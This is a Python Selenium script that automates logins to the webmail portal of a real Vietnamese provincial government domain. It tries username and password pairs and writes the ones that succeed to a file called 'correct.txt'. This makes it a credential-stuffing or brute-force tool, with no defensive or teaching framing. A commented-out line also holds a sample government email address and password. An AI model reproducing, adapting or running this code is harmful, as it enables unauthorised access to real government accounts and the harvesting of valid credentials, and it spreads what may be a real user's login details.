from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException
import time
# Set the path to the ChromeDriver executable
chromedriver_path = './chromedriver.exe'

# Create a new instance of the Chrome driver
options = webdriver.ChromeOptions()
options.add_argument('--ignore-certificate-errors')
#options.add_argument('--no-sandbox')
options.add_argument("disable-infobars")
options.add_argument('--disable-browser-side-navigation')
options.add_argument("--start-maximized")
driver = webdriver.Chrome(options=options)
# driver.set_page_load_timeout(20)
# Open the login page
driver.get('https://mail.hatinh.gov.vn/')
def login(username, password, index):
    username_field = driver.find_element(By.ID,'username')
    username_field.send_keys(username)
    # time.sleep(1)
    password_field = driver.find_element(By.ID,'password')
    password_field.send_keys(password)
    # time.sleep(1)
    password_field.send_keys(Keys.RETURN)
    time.sleep(1)
    try:
        z_username = driver.find_element(By.ID, 'z_userName')
        append_new_line('correct.txt', f'{index}.{username}|{password}')
        # time.sleep(1)
        element = driver.find_element(By.CLASS_NAME, 'DwtLinkButtonDropDownArrowTd')
        element.click()
        time.sleep(2)
        element_log_out = driver.find_element(By.ID,"logOff_title")
        element_log_out.click()
        print(f'{index}. ---------{username} - {password} ok -------------')
    except NoSuchElementException:
        print(f'{index}. {username} - {password} wrong')
def append_new_line(file_name, text_to_append):
    """Append given text as a new line at the end of file"""
    # Open the file in append & read mode ('a+')
    with open(file_name, "a+") as file_object:
        # Move read cursor to the start of file.
        file_object.seek(0)
        # If file is not empty then append '\n'
        data = file_object.read(100)
        if len(data) > 0:
            file_object.write("\n")
        # Append text at the end of file
        file_object.write(text_to_append)
        file_object.close()
# login('sonb.tt@hatinh.gov.vn', 'Abc@12345',2)

